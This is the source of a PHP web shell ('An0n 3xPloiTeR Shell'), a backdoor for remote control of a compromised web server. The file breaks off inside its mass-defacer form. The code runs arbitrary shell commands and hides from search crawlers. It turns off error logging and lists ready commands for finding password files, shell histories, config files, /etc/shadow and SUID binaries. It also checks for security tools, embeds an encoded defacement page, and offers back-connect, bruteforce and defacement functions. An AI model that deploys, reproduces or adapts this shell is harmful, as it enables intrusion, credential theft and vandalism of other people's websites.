<?php
             //++++++++======= Shell Made By An0n 3xPloiTeR :) =======++++++++ //
             //++++++++=======        Special Thanks to :	  =======++++++++ //

      # Shariq Maik | # Prinxe Haxi | # Devil Killer | # Ghazif Adeem | # An0n 3xPloiTeR | # Zero Cool | # Wahab Hacker | # Rizi Haxor | # 8R0K3N H34R7 | # CYB3R71 | # 3htisham | # And All Muslim Hackers <3

				//++++++++=======        Keep Visiting	  =======++++++++ //
	    		          //   http://howtodohacking.wordpress.com  //

				                   // Hope You Dont Edit iT :) . //

								 // Size is Small Shell is Big 8-) //

								//First Change Your Password to MD5
$auth_pass= "92deb3f274aaee236194c05729bfa443"; // Default Password is umar
$color = "white"; 					// For Changing Font Colors
$default_charset = 'Windows-1251'; // For Changing Character Set Available Are 
// 		UTF-8 
//		Windows-1251  
//		KOI8-R 
//		KOI8-U 
//		cp866
				 				// First Encode Your Deface Page to Base64
$defacepage ='PCFEb2N0eXBlIGh0bWw+Cgk8aHRtbD4KCQk8aGVhZD4KCQkJPHNjcmlwdD5hbGVydCgiSGFja2VkIEJ5IEFuMG4gM3hQbG9pVGVSIik7PC9zY3JpcHQ+CgkJCTxzY3JpcHQ+YWxlcnQoIlRlYW0gUGFrIEN5YmVyIEdob3N0cyBbUC5DLkddIik7PC9zY3JpcHQ+CgkJCTx0aXRsZT4gSGFja2VkIEJ5IEFuMG4gM3hQbG9pVGVSIEFuZCA4QjBLM04gSDM0UjcgPC90aXRsZT4KCQk8L2hlYWQ+CgoJCTxib2R5IGJnY29sb3I9ImJsYWNrIj4KCQkJPGNlbnRlcj48YnI+PGJyPjxicj48YnI+CgkJCTxmb250IHNpemU9IjMwIiBjb2xvcj0icmVkIiBmYWNlPSJjYWxpYnJpIj4gSGFja2VkIEJ5IEFuMG4gM3hQbG9pVGVSIEFuZCA4QjBLM04gSDM0UjcgPC9mb250Pjxicj4KCQkJPGZvbnQgc2l6ZT0iMzAiIGNvbG9yPSJyZWQiIGZhY2U9ImNhbGlicmkiPiBUZWFtIFBhayBDeWJlciBHaG9zdHMgW1AuQy5HXTwvZm9udD48aWZyYW1lIHNyYz0iaHR0cHM6Ly93d3cueW91dHViZS5jb20vZW1iZWQvblBHSWRUQWVPU2c/cmVsPTAmYXV0b3BsYXk9MSZsb29wPTEmcGxheWxpc3Q9blBHSWRUQWVPU2ciIGFsbG93ZnVsbHNjcmVlbj0iIiBmcmFtZWJvcmRlcj0iMCIgaGVpZ2h0PSIwIiB3aWR0aD0iMCI+PC9pZnJhbWU+PGJvZHkgYmdjb2xvcj0iYmxhY2siPjxjZW50ZXI+PHNjcmlwdCBsYW5ndWFnZT0iSmF2YVNjcmlwdDEuMiI+ZnVuY3Rpb24gZWpzX25vZHJvaXQoKXthbGVydCgnIFBha2lzdGFuIFppbmRhYmFkIDwzICcpO3JldHVybihmYWxzZSk7fWRvY3VtZW50Lm9uY29udGV4dG1lbnUgPSBlanNfbm9kcm9pdDs8L3NjcmlwdD48YnI+PGJyPjxmb250IHNpemU9IjUiIGNvbG9yPSJ3aGl0ZSIgZmFjZT0iY2FsaWJyaSI+IFBha2lzdGFuIFppbmRhYmFkICA8L2ZvbnQ+PGJyPjxicj48YnI+PGZvbnQgc2l6ZT0iNSIgY29sb3I9IndoaXRlIiBmYWNlPSJjYWxpYnJpIj4gR3JlZXR6IH48bWFycXVlZSB3aWR0aD0iODAlIj4jIFNoYXJpcSBNYWlrIHwgIyBQcmlueGUgSGF4aSB8ICMgQW4wbiAzeFBsb2lUZVIgfCAjIFVua25vd24gfCAjIFdhaGFiIEhhY2tlciB8ICMgUml6aSBIYXhvciB8ICMgOFIwSzNOIEgzNFI3IHwgIyBDWUIzUjcxIHwgIyAzaHRpc2hhbSB8ICMgQW5kIEFsbCBNdXNsaW1zPC9tYXJxdWVlPjwvZm9udD48YnI+PC9jZW50ZXI+CgkJPC9ib2R5PgoJPC9odG1sPg==';

	// =========================== Special Thanks to Ali Khan For Shells ====================== //
$default_action = 'FilesMan';
$default_use_ajax = true;

if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
@define('An0n 3xPloiTeR Shell');

if(get_magic_quotes_gpc()) {
	function An0n3xPloiTeRstripslashes($array) {
		return is_array($array) ? array_map('An0n3xPloiTeRstripslashes', $array) : stripslashes($array);
	}
	$_POST = An0n3xPloiTeRstripslashes($_POST);
    $_COOKIE = An0n3xPloiTeRstripslashes($_COOKIE);
}

function An0n3xPloiTeRlogin() {
	die ('<!DOCTYPE html>
<html>
	<head>
		<title>An0n 3xPloiTeR Shell</title>
		<meta charset="UTF-8">
		<meta http-equiv="refresh" content=""> <!-- For Refreshing after ____ interval of time -->
		<meta name="description" content="Sites description">
		<meta name="about" content="Made By An0n 3xPloiTeR">
		<meta name="description" content="For Logging into the system">
		<style>
			.body {
				margin-top: 7vh;
				text-transform: capitalize;				
				background: black url("http://i66.tinypic.com/2j33a85.jpg");
				background-repeat:no-repeat;
				background-position: center;
				background-attachment: fixed;
	            -webkit-background-size: cover;
                -moz-background-size: cover;
                -o-background-size: cover;
                background-size: cover;
			}
			.font {
				font-family: calibri;
				font-size: 300%;
				text-align: center;
				color: white;
			}
			.upass {
				margin-top: 70vh;
				font-family: calibri;
				font-size: 100%;
				text-align: center;
				color: black;
			}
			.input {
				margin:0;background-color:black;border:1px solid black; 
			}
		</style>
		<script language="JavaScript1.2">
			function ejs_nodroit(){
				alert("Login Please!");
				return(false);
			}
			document.oncontextmenu = ejs_nodroit;
		</script>
	</head>

	<body class="body">
		<div class="font">
			<font>login Page</font><br>
		</div>
		<div class="upass">
			<form method=post>
			<input class="input" type="password" name="pass" size="25"/>
			</form>
		</div>
	</body>
</html>');
}

function An0n3xPloiTeRsetcookie($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}

if(!empty($auth_pass)) {
    if(isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass))
        An0n3xPloiTeRsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);

    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
        An0n3xPloiTeRLogin();
}

if(strtolower(substr(PHP_OS,0,3)) == "win")
	$os = 'win';
else
	$os = 'nix';

$safe_mode = @ini_get('safe_mode');
if(!$safe_mode)
    error_reporting(0);

$disable_functions = @ini_get('disable_functions');
$home_cwd = @getcwd();
if(isset($_POST['c']))
	@chdir($_POST['c']);
$cwd = @getcwd();
if($os == 'win') {
	$home_cwd = str_replace("\\", "/", $home_cwd);
	$cwd = str_replace("\\", "/", $cwd);
}
if($cwd[strlen($cwd)-1] != '/')
	$cwd .= '/';

if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax']))
    $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$default_use_ajax;

if($os == 'win')
	$aliases = array(
		"List Directory" => "dir",
    	"Find index.php in current dir" => "dir /s /w /b index.php",
    	"Find *config*.php in current dir" => "dir /s /w /b *config*.php",
    	"Show active connections" => "netstat -an",
    	"Show running services" => "net start",
    	"User accounts" => "net user",
    	"Show computers" => "net view",
		"ARP Table" => "arp -a",
		"IP Configuration" => "ipconfig /all"
	);
else
	$aliases = array(
  		"List dir" => "ls -lha",
		"list file attributes on a Linux second extended file system" => "lsattr -va",
  		"show opened ports" => "netstat -an | grep -i listen",
        "process status" => "ps aux",
		"Find" => "",
  		"find suid" => "find / -type f -perm -04000 -ls",
  		"find suid in current dir" => "find . -type f -perm -04000 -ls",
  		"find sgid" => "find / -type f -perm -02000 -ls",
  		"find sgid files in current dir" => "find . -type f -perm -02000 -ls",
  		"find config.inc.php" => "find / -type f -name config.inc.php",
  		"find config*" => "find / -type f -name \"config*\"",
  		"find config* in current dir" => "find . -type f -name \"config*\"",
  		"find writable folders and files" => "find / -perm -2 -ls",
  		"find writable folders and files in current dir" => "find . -perm -2 -ls",
  		"find service.pwd" => "find / -type f -name service.pwd",
  		"find service.pwd files in current dir" => "find . -type f -name service.pwd",
  		"find .htpasswd" => "find / -type f -name .htpasswd",
  		"find .htpasswd files in current dir" => "find . -type f -name .htpasswd",
  		"find .bash_history" => "find / -type f -name .bash_history",
  		"find .bash_history files in current dir" => "find . -type f -name .bash_history",
  		"find .fetchmailrc" => "find / -type f -name .fetchmailrc",
  		"find .fetchmailrc files in current dir" => "find . -type f -name .fetchmailrc",
		"Locate" => "",
  		"locate httpd.conf" => "locate httpd.conf",
		"locate vhosts.conf" => "locate vhosts.conf",
		"locate proftpd.conf" => "locate proftpd.conf",
		"locate psybnc.conf" => "locate psybnc.conf",
		"locate my.conf" => "locate my.conf",
		"locate admin.php" =>"locate admin.php",
		"locate cfg.php" => "locate cfg.php",
		"locate conf.php" => "locate conf.php",
		"locate config.dat" => "locate config.dat",
		"locate config.php" => "locate config.php",
		"locate config.inc" => "locate config.inc",
		"locate config.inc.php" => "locate config.inc.php",
		"locate config.default.php" => "locate config.default.php",
		"locate config*" => "locate config",
		"locate .conf"=>"locate '.conf'",
		"locate .pwd" => "locate '.pwd'",
		"locate .sql" => "locate '.sql'",
		"locate .htpasswd" => "locate '.htpasswd'",
		"locate .bash_history" => "locate '.bash_history'",
		"locate .mysql_history" => "locate '.mysql_history'",
		"locate .fetchmailrc" => "locate '.fetchmailrc'",
		"locate backup" => "locate backup",
		"locate dump" => "locate dump",
		"locate priv" => "locate priv"
	);

function An0n3xPloiTeRHeader() {
	if(empty($_POST['charset']))
		$_POST['charset'] = $GLOBALS['default_charset'];
	global $color;
	echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><link rel='SHORTCUT ICON' href='http://i66.tinypic.com/2j33a85.jpg'><title>An0n 3xPloiTeR Shell</title>
<script type='text/javascript'>
function tukar(lama,baru){
	document.getElementById(lama).style.display = 'none';
	document.getElementById(baru).style.display = 'block';
}
</script><script language='JavaScript1.2'>
			function ejs_nodroit(){
				alert('Script Kiddie Found !!! :P');
				return(false);
			}
			document.oncontextmenu = ejs_nodroit;
		</script>";
		?>

<script language='javascript'>
if (document.all||document.getElementById){
var thetitle=document.title
document.title=''
}
var data="9494 Team Pak Cyber Ghosts 3215135138321";
var done=1;
function statusIn(text){
decrypt(text,22,22);
}
function statusOut(){
self.status='';
done=1;
}
function decrypt(text, max, delay){
if (done){
done = 0;
rantit(text, max, delay, 0, max);
} 
}
function rantit(text, runs_left, delay, charvar, max){
if (!done){
runs_left = runs_left - 1;
var status = text.substring(0,charvar);
for(var current_char = charvar; current_char < text.length; current_char++){
status += data.charAt(Math.round(Math.random()*data.length));
}
document.title = status;
var rerun = "rantit('" + text + "'," + runs_left + "," + delay + "," + charvar + "," + max + ");"
var new_char = charvar + 1;
var next_char = "rantit('" + text + "'," + max + "," + delay + "," + new_char + "," + max + ");"
if(runs_left > 0){
setTimeout(rerun, delay);
}
else{
if (charvar < text.length){
setTimeout(next_char, Math.round(delay*(charvar+3)/(charvar+1)));
}
else
{
done = 1;
}
}
}
}
if (document.all||document.getElementById)
statusIn(thetitle)
</script>

		<?php
		echo "
<style>
body{background-color:#222;color:#e1e1e1;}
body,td,th{ font: 10pt Comic Sans MS, sans-serif;margin:0;vertical-align:top;color:#e1e1e1; }
table.info{ color:#fff;background: url('http://i68.tinypic.com/11bt5za.jpg');
				background-repeat:no-repeat;
				background-position: top;
				background-attachment: fixed;
	            -webkit-background-size: cover;
                -moz-background-size: cover;
                -o-background-size: cover;
                background-size: cover;}
span,h1,a{ color: $color !important; }
span{ font-weight: bolder; }
h1{ border-left:5px solid $color;padding: 2px 5px;font: 14pt Verdana;background-color:teal;margin:0px; }
div.content{ padding: 5px;margin-left:5px;background-color:#333; }
a{ text-decoration:none; }
a:hover{ text-decoration:underline; }
.ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }
.bigarea{ width:100%;height:300px; }
input,textarea,select{ margin:0;color:#fff;background-color:#555;border:1px solid $color; font: 9pt Monospace,'Courier New'; }
input[type='button']:hover,input[type='submit']:hover {background-color: $color;color:#000;} 
form{ margin:0px; }
#toolsTbl{ text-align:center; }
.toolsInp{ width: 300px }
.main th{text-align:left;background-color:#5e5e5e;}
.main tr:hover{background-color:#5e5e5e}
.l1{background-color:#444}
.l2{background-color:#333}
pre{font-family:Courier,Monospace;}
</style>
<script>
    var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';
    var a_ = '" . htmlspecialchars(@$_POST['a']) ."'
    var charset_ = '" . htmlspecialchars(@$_POST['charset']) ."';
    var p1_ = '" . ((strpos(@$_POST['p1'],"\n")!==false)?'':htmlspecialchars($_POST['p1'],ENT_QUOTES)) ."';
    var p2_ = '" . ((strpos(@$_POST['p2'],"\n")!==false)?'':htmlspecialchars($_POST['p2'],ENT_QUOTES)) ."';
    var p3_ = '" . ((strpos(@$_POST['p3'],"\n")!==false)?'':htmlspecialchars($_POST['p3'],ENT_QUOTES)) ."';
    var d = document;
	function set(a,c,p1,p2,p3,charset) {
		if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
		if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
		if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
		if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
		if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
		if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
	}
	function g(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		d.mf.submit();
	}
	function a(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		var params = 'ajax=true';
		for(i=0;i<d.mf.elements.length;i++)
			params += '&'+d.mf.elements[i].name+'='+encodeURIComponent(d.mf.elements[i].value);
		sr('" . addslashes($_SERVER['REQUEST_URI']) ."', params);
	}
	function sr(url, params) {
		if (window.XMLHttpRequest)
			req = new XMLHttpRequest();
		else if (window.ActiveXObject)
			req = new ActiveXObject('Microsoft.XMLHTTP');
        if (req) {
            req.onreadystatechange = processReqChange;
            req.open('POST', url, true);
            req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded');
            req.send(params);
        }
	}
	function processReqChange() {
		if( (req.readyState == 4) )
			if(req.status == 200) {
				var reg = new RegExp(\"(\\\\d+)([\\\\S\\\\s]*)\", 'm');
				var arr=reg.exec(req.responseText);
				eval(arr[2].substr(0, arr[1]));
			} else alert('Request error!');
	}
</script>
<head><body><div style='position:absolute;width:100%;background-color:#444;top:0;left:0;'>
<form method=post name=mf style='display:none;'>
<input type=hidden name=a>
<input type=hidden name=c>
<input type=hidden name=p1>
<input type=hidden name=p2>
<input type=hidden name=p3>
<input type=hidden name=charset>
</form>";
	$freeSpace = @diskfreespace($GLOBALS['cwd']);
	$totalSpace = @disk_total_space($GLOBALS['cwd']);
	$totalSpace = $totalSpace?$totalSpace:1;
	$release = @php_uname('r');
	$kernel = @php_uname('s');
	$explink = 'http://exploit-db.com/search/?action=search&filter_description=';
	if(strpos('Linux', $kernel) !== false)
		$explink .= urlencode('Linux Kernel ' . substr($release,0,6));
	else
		$explink .= urlencode($kernel . ' ' . substr($release,0,3));
	if(!function_exists('posix_getegid')) {
		$user = @get_current_user();
		$uid = @getmyuid();
		$gid = @getmygid();
		$group = "?";
	} else {
		$uid = @posix_getpwuid(posix_geteuid());
		$gid = @posix_getgrgid(posix_getegid());
		$user = $uid['name'];
		$uid = $uid['uid'];
		$group = $gid['name'];
		$gid = $gid['gid'];
	}

	$cwd_links = '';
	$path = explode("/", $GLOBALS['cwd']);
	$n=count($path);
	for($i=0; $i<$n-1; $i++) {
		$cwd_links .= "<a href='#' onclick='g(\"FilesMan\",\"";
		for($j=0; $j<=$i; $j++)
			$cwd_links .= $path[$j].'/';
		$cwd_links .= "\")'>".$path[$i]."/</a>";
	}

	$charsets = array('UTF-8', 'Windows-1251', 'KOI8-R', 'KOI8-U', 'cp866');
            $opt_charsets = '';
            foreach($charsets as $item)
                    $opt_charsets .= '<option value="'.$item.'" '.($_POST['charset']==$item?'selected':'').'>'.$item.'</option>';
     
            $m = array('Sec Info'=>'SecInfo','Files'=>'FilesMan','Exec'=>'Console','Sql'=>'Sql','Defacer' => 'Deface','Shells'=>'Shells','Tools'=> 'Tools','Port Scanner' => 'PortScanner','Php'=>'Php','Safe mode'=>'SafeMode','String tools'=>'StringTools','Bruteforce'=>'Bruteforce','Back-Connect'=>'Network','Injector'=>'Injector','Domains' => 'Domain','Zone-h' => 'ZHposter','About Me'=>'About');
            if(!empty($GLOBALS['auth_pass']))
                    $m['Logout'] = 'Logout';
            $m['Self remove'] = 'SelfRemove';
            $menu = '';
            foreach($m as $k => $v)
                    $menu .= '<th width="'.(int)(100/count($m)).'%">[<a href="#" onclick="g(\''.$v.'\',null,\'\',\'\',\'\')">'.$k.'</a>]</th>';

    if($GLOBALS['os'] == 'nix') {
        $dominios = @file_get_contents("/etc/named.conf");
        if(!$dominios) {
            $DomainS = "/var/named";
            $Domainonserver = scandir($DomainS);
            $d0c = count($Domainonserver);
        } else {
            @preg_match_all('/.*?zone "(.*?)" {/', $dominios, $out);
            $out = sizeof(array_unique($out[1]));
            $d0c = $out."  Domains";
        }
    } else {
        $d0c = "None";
    }
     
            $drives = "";
	if($GLOBALS['os'] == 'win') {
		foreach(range('c','z') as $drive)
		if(is_dir($drive.':\\'))
			$drives .= '<a href="#" onclick="g(\'FilesMan\',\''.$drive.':/\')">[ '.$drive.' ]</a> ';
	}
	echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:' . ($GLOBALS['os'] == 'win'?'<br>Drives:':'') . '</span></td>'
       . '<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href="' . $explink . '" target=_blank>[exploit-db.com]</a></nobr><br>' . $uid . ' ( ' . $user . ' ) <span>Group:</span> ' . $gid . ' ( ' . $group . ' )<br>' . @phpversion() . ' <span>Safe mode:</span> ' . ($GLOBALS['safe_mode']?'<font color=red>ON</font>':'<font color=green><b>OFF</b></font>')
       . ' <a href=# onclick="g(\'Php\',null,\'\',\'info\')">[ phpinfo ]</a> <span>Datetime:</span> ' . date('h:i:s d-m-Y') . '<br>' . An0n3xPloiTeRViewSize($totalSpace) . ' <span>Free:</span> ' . An0n3xPloiTeRViewSize($freeSpace) . ' ('. (int) ($freeSpace/$totalSpace*100) . '%)<br>' . $cwd_links . ' '. An0n3xPloiTeRPermsColor($GLOBALS['cwd']) . ' <a href=# onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')">[ home ]</a><br>' . $drives . '</td>' . ''
       . '<td width=1 align=right><nobr><select onchange="g(null,null,null,null,null,this.value)"><optgroup label="Page charset">' . $opt_charsets . '</optgroup></select><br><span>Domains&nbsp;:&nbsp;</span>' .$d0c. '<br><span>Server IP:</span><br>' . @$_SERVER["SERVER_ADDR"] . '<br><span>Client IP:</span><br>' . $_SERVER['REMOTE_ADDR'] . '</nobr></td></tr></table>'
       . '<table style="border-top:2px solid #333;" cellpadding=3 cellspacing=0 width=100%><tr>' . $menu . '</tr></table><div style="margin:5">';
}

function An0n3xPloiTeRFooter() {
	$is_writable = is_writable($GLOBALS['cwd'])?" <font color='green'>(Writeable)</font>":" <font color=red>(Not writable)</font>";
    echo "
</div>
<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style='border-top:2px solid #333;border-bottom:2px solid #333;'>
	<tr>
		<td><form onsubmit='g(null,this.c.value,\"\");return false;'><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'><input type=submit value='>>'></form></td>
		<td><form onsubmit=\"g('FilesTools',null,this.f.value);return false;\"><span>Read file:</span><br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td>
	</tr><tr><hr>
	<center><form action='' method='POST'><input type='submit' name='defacepage' value='Add Deface Here'></form></center><hr>
		<td><form onsubmit=\"g('FilesMan',null,'mkdir',this.d.value);return false;\"><span>Make dir:</span>$is_writable<br><input class='toolsInp' type=text name=d><input type=submit value='>>'></form></td>
		<td><form onsubmit=\"g('FilesTools',null,this.f.value,'mkfile');return false;\"><span>Make file:</span>$is_writable<br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td>
	</tr><tr>
		<td><form onsubmit=\"g('Console',null,this.c.value);return false;\"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='>>'></form></td>
		<td><form method='post' ENCTYPE='multipart/form-data'>
		<input type=hidden name=a value='FilesMAn'>
		<input type=hidden name=c value='" . $GLOBALS['cwd'] ."'>
		<input type=hidden name=p1 value='uploadFile'>
		<input type=hidden name=charset value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
		<span>Upload file:</span>$is_writable<br><input class='toolsInp' type=file name=f><input type=submit value='>>'></form><br  ></td>
	  </tr></table></div></body></html>";
}

if (!function_exists("posix_getpwuid") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid')===false)) {
    function posix_getpwuid($p) {return false;} }
if (!function_exists("posix_getgrgid") && (strpos($GLOBALS['disable_functions'], 'posix_getgrgid')===false)) {
    function posix_getgrgid($p) {return false;} }

function An0n3xPloiTeREx($in) {
	$out = '';
	if (function_exists('exec')) {
		@exec($in,$out);
		$out = @join("\n",$out);
	} elseif (function_exists('passthru')) {
		ob_start();
		@passthru($in);
		$out = ob_get_clean();
	} elseif (function_exists('system')) {
		ob_start();
		@system($in);
		$out = ob_get_clean();
	} elseif (function_exists('shell_exec')) {
		$out = shell_exec($in);
	} elseif (is_resource($f = @popen($in,"r"))) {
		$out = "";
		while(!@feof($f))
			$out .= fread($f,1024);
		pclose($f);
	}
	return $out;
}

function An0n3xPloiTeRViewSize($s) {
    if (is_int($s))
        $s = sprintf("%u", $s);
    
	if($s >= 1073741824)
		return sprintf('%1.2f', $s / 1073741824 ). ' GB';
	elseif($s >= 1048576)
		return sprintf('%1.2f', $s / 1048576 ) . ' MB';
	elseif($s >= 1024)
		return sprintf('%1.2f', $s / 1024 ) . ' KB';
	else
		return $s . ' B';
}

function An0n3xPloiTeRPerms($p) {
	if (($p & 0xC000) == 0xC000)$i = 's';
	elseif (($p & 0xA000) == 0xA000)$i = 'l';
	elseif (($p & 0x8000) == 0x8000)$i = '-';
	elseif (($p & 0x6000) == 0x6000)$i = 'b';
	elseif (($p & 0x4000) == 0x4000)$i = 'd';
	elseif (($p & 0x2000) == 0x2000)$i = 'c';
	elseif (($p & 0x1000) == 0x1000)$i = 'p';
	else $i = 'u';
	$i .= (($p & 0x0100) ? 'r' : '-');
	$i .= (($p & 0x0080) ? 'w' : '-');
	$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-'));
	$i .= (($p & 0x0020) ? 'r' : '-');
	$i .= (($p & 0x0010) ? 'w' : '-');
	$i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-'));
	$i .= (($p & 0x0004) ? 'r' : '-');
	$i .= (($p & 0x0002) ? 'w' : '-');
	$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
	return $i;
}

function An0n3xPloiTeRPermsColor($f) {
	if (!@is_readable($f))
		return '<font color=#FF0000>' . An0n3xPloiTeRPerms(@fileperms($f)) . '</font>';
	elseif (!@is_writable($f))
		return '<font color=white>' . An0n3xPloiTeRPerms(@fileperms($f)) . '</font>';
	else
		return '<font color=#25ff00>' . An0n3xPloiTeRPerms(@fileperms($f)) . '</font>';
}

function An0n3xPloiTeRScandir($dir) {
    if(function_exists("scandir")) {
        return scandir($dir);
    } else {
        $dh  = opendir($dir);
        while (false !== ($filename = readdir($dh)))
            $files[] = $filename;
        return $files;
    }
}

function An0n3xPloiTeRWhich($p) {
	$path = An0n3xPloiTeREx('which ' . $p);
	if(!empty($path))
		return $path;
	return false;
}

function actionSecInfo() {
	An0n3xPloiTeRHeader();
	echo '<center><h1>Server security information</h1></center><div class=content>';
	function An0n3xPloiTeRSecParam($n, $v) {
		$v = trim($v);
		if($v) {
			echo '<span>' . $n . ': </span>';
			if(strpos($v, "\n") === false)
				echo $v . '<br>';
			else
				echo '<pre class=ml1>' . $v . '</pre>';
		}
	}

	An0n3xPloiTeRSecParam('Server software', @getenv('SERVER_SOFTWARE'));
    if(function_exists('apache_get_modules'))
        An0n3xPloiTeRSecParam('Loaded Apache modules', implode(', ', apache_get_modules()));
	An0n3xPloiTeRSecParam('Disabled PHP Functions', $GLOBALS['disable_functions']?$GLOBALS['disable_functions']:'none');
	An0n3xPloiTeRSecParam('Open base dir', @ini_get('open_basedir'));
	An0n3xPloiTeRSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
	An0n3xPloiTeRSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
	An0n3xPloiTeRSecParam('cURL support', function_exists('curl_version')?'enabled':'no');
	$temp=array();
	if(function_exists('mysql_get_client_info'))
		$temp[] = "MySql (".mysql_get_client_info().")";
	if(function_exists('mssql_connect'))
		$temp[] = "MSSQL";
	if(function_exists('pg_connect'))
		$temp[] = "PostgreSQL";
	if(function_exists('oci_connect'))
		$temp[] = "Oracle";
	An0n3xPloiTeRSecParam('Supported databases', implode(', ', $temp));
	echo '<br>';

	if($GLOBALS['os'] == 'nix') {
            An0n3xPloiTeRSecParam('Readable /etc/passwd', @is_readable('/etc/passwd')?"yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"passwd\")'>[view]</a>":'no');
            An0n3xPloiTeRSecParam('Readable /etc/shadow', @is_readable('/etc/shadow')?"yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"shadow\")'>[view]</a>":'no');
            An0n3xPloiTeRSecParam('OS version', @file_get_contents('/proc/version'));
            An0n3xPloiTeRSecParam('Distr name', @file_get_contents('/etc/issue.net'));
            if(!$GLOBALS['safe_mode']) {
                $userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
                $danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');
                $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
                echo '<br>';
                $temp=array();
                foreach ($userful as $item)
                    if(An0n3xPloiTeRWhich($item))
                        $temp[] = $item;
                An0n3xPloiTeRSecParam('Userful', implode(', ',$temp));
                $temp=array();
                foreach ($danger as $item)
                    if(An0n3xPloiTeRWhich($item))
                        $temp[] = $item;
                An0n3xPloiTeRSecParam('Danger', implode(', ',$temp));
                $temp=array();
                foreach ($downloaders as $item)
                    if(An0n3xPloiTeRWhich($item))
                        $temp[] = $item;
                An0n3xPloiTeRSecParam('Downloaders', implode(', ',$temp));
                echo '<br/>';
                An0n3xPloiTeRSecParam('HDD space', An0n3xPloiTeREx('df -h'));
                An0n3xPloiTeRSecParam('Hosts', @file_get_contents('/etc/hosts'));
                echo '<br/><span>posix_getpwuid ("Read" /etc/passwd)</span><table><form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);return false;\'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000></td></tr></table><input type=submit value=">>"></form>';
                if (isset ($_POST['p2'], $_POST['p3']) && is_numeric($_POST['p2']) && is_numeric($_POST['p3'])) {
                    $temp = "";
                    for(;$_POST['p2'] <= $_POST['p3'];$_POST['p2']++) {
                        $uid = @posix_getpwuid($_POST['p2']);
                        if ($uid)
                            $temp .= join(':',$uid)."\n";
                    }
                    echo '<br/>';
                    An0n3xPloiTeRSecParam('Users', $temp);
                }
            }
	} else {
		An0n3xPloiTeRSecParam('OS Version',An0n3xPloiTeREx('ver'));
		An0n3xPloiTeRSecParam('Account Settings',An0n3xPloiTeREx('net accounts'));
		An0n3xPloiTeRSecParam('User Accounts',An0n3xPloiTeREx('net user'));
	}
	echo '</div>';
	An0n3xPloiTeRFooter();
}


function actionDeface() {
                                                                    An0n3xPloiTeRHeader();
                                                                    echo "<center><h1>Mass Defacer</h1></center><div class=content>";
?>

<form ENCTYPE="multipart/form-data" action="<?$_SERVER['PHP_SELF']?>" method=POST onSubmit="g(null,null,this.path.value,this.file.value,this.Contents.value);return false;">
<p align="Left">Folder: <input type=text name=path size=60 value="<?=getcwd(); ?>">
<br>file name : <input type=text name=file size=20 value="index.php">
<br>Text Content : <br><textarea type=text name=Contents cols=70 rows=15 placeholder="Deface Text Here"><!Doctype html>
	<html>
		<head>
			<script>alert("Hacked By An0n 3xPloiTeR");</script>
			<script>alert("Team Pak Cyber Ghosts [P.C.G]");</script>
			<title> Hacked By An0n 3xPloiTeR And 8B0K3N H34R7 </title>
		</head>

		<body bgcolor="black">
			<center><br><br><br><br>
			<font size="30" color="red" face="calibri"> Hacked By An0n 3xPloiTeR And 8B0K3N H34R7 </font><br>
